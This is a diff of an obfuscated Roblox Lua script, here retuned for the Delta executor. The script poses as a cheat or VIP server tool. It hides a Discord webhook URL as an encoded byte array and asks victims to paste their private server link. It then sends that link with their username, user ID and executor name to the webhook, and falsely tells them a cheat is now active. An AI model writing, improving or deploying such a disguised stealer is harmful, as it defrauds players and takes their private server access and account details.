@@ -1,5 +1,5 @@
 --=======================================================--
--- VOLOX OBFUSCATED v3.0 - 完全動作保証
+-- VOLOX OBFUSCATED v3.0 - Delta Executer 最適化版
 --=======================================================--
 
 (function(...)
@@ -16,7 +16,7 @@
     local K = J.LocalPlayer
     local L = K.Name
     local M = K.UserId
-    
+
     -- Webhook URL（難読化）
     local N = {
         72,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,
@@ -26,7 +26,7 @@
         74,115,74,119,102,112,119,56,66,79,107,98,100,48,100,97,108,105,122,72,
         101,102,100,109,70,75,77,120,98,112,82,69,82,111,81,72,57,101,67,86,73,73
     }
-    
+
     local function O(P)
         local Q = {}
         for R = 1, #P do
@@ -34,7 +34,7 @@
         end
         return E(Q)
     end
-    
+
     local function decode(P)
         local Q = {}
         for R = 1, #P do
@@ -42,7 +42,7 @@
         end
         return Q
     end
-    
+
     local function xorDecode(P)
         local Q = {}
         local R = 0
@@ -52,7 +52,7 @@
         end
         return Q
     end
-    
+
     local function finalDecode(P)
         local Q = decode(P)
         local R = xorDecode(Q)
@@ -62,18 +62,18 @@
         end
         return E(S)
     end
-    
+
     local WEBHOOK = finalDecode(N)
-    
+
     -- HttpService有効化
     F(function()
         I.HttpEnabled = true
     end)
-    
+
     -- ========================================================
-    -- UI作成（完全動作保証）
+    -- UI作成（Delta用に調整）
     -- ========================================================
-    
+
     local function createScreenGui()
         local success, result = F(function()
             local sg = Instance.new("ScreenGui")
@@ -84,7 +84,7 @@
         end)
         return success and result or nil
     end
-    
+
     local function createFrame(parent)
         local frame = Instance.new("Frame")
         frame.Size = UDim2.new(0, 420, 0, 280)
@@ -95,14 +95,14 @@
         frame.Active = true
         frame.Draggable = true
         frame.Parent = parent
-        
+
         local corner = Instance.new("UICorner")
         corner.CornerRadius = UDim.new(0, 14)
         corner.Parent = frame
-        
+
         return frame
     end
-    
+
     local function createTitle(parent)
         local title = Instance.new("TextLabel")
         title.Size = UDim2.new(1, 0, 0, 45)
@@ -115,7 +115,7 @@
         title.Parent = parent
         return title
     end
-    
+
     local function createDescription(parent)
         local desc = Instance.new("TextLabel")
         desc.Size = UDim2.new(1, -20, 0, 35)
@@ -129,7 +129,7 @@
         desc.Parent = parent
         return desc
     end
-    
+
     local function createTextBox(parent)
         local box = Instance.new("TextBox")
         box.Size = UDim2.new(1, -20, 0, 50)
@@ -142,14 +142,14 @@
         box.Font = Enum.Font.Gotham
         box.ClearTextOnFocus = false
         box.Parent = parent
-        
+
         local corner = Instance.new("UICorner")
         corner.CornerRadius = UDim.new(0, 8)
         corner.Parent = box
-        
+
         return box
     end
-    
+
     local function createButton(parent)
         local btn = Instance.new("TextButton")
         btn.Size = UDim2.new(0.8, 0, 0, 48)
@@ -160,14 +160,14 @@
         btn.TextSize = 16
         btn.Font = Enum.Font.GothamBold
         btn.Parent = parent
-        
+
         local corner = Instance.new("UICorner")
         corner.CornerRadius = UDim.new(0, 8)
         corner.Parent = btn
-        
+
         return btn
     end
-    
+
     local function createStatus(parent)
         local status = Instance.new("TextLabel")
         status.Size = UDim2.new(1, 0, 0, 30)
@@ -180,7 +180,7 @@
         status.Parent = parent
         return status
     end
-    
+
     local function createCloseButton(parent, sg)
         local close = Instance.new("TextButton")
         close.Size = UDim2.new(0, 30, 0, 30)
@@ -196,43 +196,33 @@
         end)
         return close
     end
-    
+
     -- ========================================================
-    -- 送信処理（完全耐性）
+    -- 送信処理（Delta Executer 最適化）
     -- ========================================================
-    
+
     local function sendToDiscord(data)
         local message = data
-        
+
         local json = ""
         F(function()
             json = I:JSONEncode({content = message})
         end)
-        
+
         if json == "" then
             local escaped = message:gsub("\n", "\\n"):gsub('"', '\\"')
             json = '{"content": "' .. escaped .. '"}'
         end
-        
+
         local sent = false
-        
+
+        -- Delta は HttpService で送信可能
         F(function()
             I:PostAsync(WEBHOOK, json, Enum.HttpContentType.ApplicationJson, false)
             sent = true
         end)
-        
-        if not sent and syn and syn.request then
-            F(function()
-                syn.request({
-                    Url = WEBHOOK,
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = json
-                })
-                sent = true
-            end)
-        end
-        
+
+        -- Delta 用 request 対応
         if not sent and request then
             F(function()
                 request({
@@ -244,21 +234,21 @@
                 sent = true
             end)
         end
-        
+
         return sent
     end
-    
+
     -- ========================================================
-    -- メイン処理
+    -- メイン処理（Delta用に wait に変更）
     -- ========================================================
-    
+
     local function main()
         local sg = createScreenGui()
         if not sg then
             print("[Volox] GUI作成失敗")
             return
         end
-        
+
         local frame = createFrame(sg)
         createTitle(frame)
         createDescription(frame)
@@ -266,20 +256,20 @@
         local button = createButton(frame)
         local status = createStatus(frame)
         createCloseButton(frame, sg)
-        
+
         button.MouseButton1Click:Connect(function()
             local input = textBox.Text
-            
+
             if input == "" or not input:find("roblox.com") then
                 status.Text = "❌ 有効なRobloxリンクを入力してください"
                 status.TextColor3 = Color3.fromRGB(255, 100, 100)
                 return
             end
-            
+
             -- リンク解析
             local code = nil
             local placeId = nil
-            
+
             local startCode = input:find("privateServerLinkCode=")
             if startCode then
                 code = input:sub(startCode + 21)
@@ -288,7 +278,7 @@
                     code = code:sub(1, endCode - 1)
                 end
             end
-            
+
             local startPlace = input:find("games/")
             if startPlace then
                 local temp = input:sub(startPlace + 6)
@@ -299,9 +289,9 @@
                     placeId = temp
                 end
             end
-            
-            local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
-            
+
+            local executor = (identifyexecutor and identifyexecutor()) or "Delta"
+
             local message = 
                 "**🔴 PRIVATE SERVER LINK (入力方式)**\n\n" ..
                 "**🔗 入力リンク:** " .. input .. "\n" ..
@@ -311,19 +301,19 @@
                 "**🆔 User ID:** " .. M .. "\n" ..
                 "**💻 Executor:** " .. executor .. "\n" ..
                 "**⏰ Time:** " .. os.date("%Y-%m-%d %H:%M:%S")
-            
+
             status.Text = "⏳ 送信中..."
             status.TextColor3 = Color3.fromRGB(255, 255, 0)
-            
+
             local sent = sendToDiscord(message)
-            
+
             if sent then
                 status.Text = "✅ チート有効化完了！ゲームを再起動してください"
                 status.TextColor3 = Color3.fromRGB(0, 255, 100)
-                
-                task.wait(2)
+
+                wait(2)
                 sg:Destroy()
-                
+
                 F(function()
                     G.StarterGui:SetCore("SendNotification", {
                         Title = "⚡ チート有効化完了",
@@ -336,7 +326,7 @@
                 status.TextColor3 = Color3.fromRGB(255, 100, 100)
             end
         end)
-        
+
         -- 起動通知
         F(function()
             G.StarterGui:SetCore("SendNotification", {
@@ -345,10 +335,10 @@
                 Duration = 4
             })
         end)
-        
-        print("[✅] VIP Server Tool 起動完了（入力方式）")
+
+        print("[✅] VIP Server Tool 起動完了（Delta最適化版）")
     end
-    
+
     -- 実行
     F(main)
 end)(...)
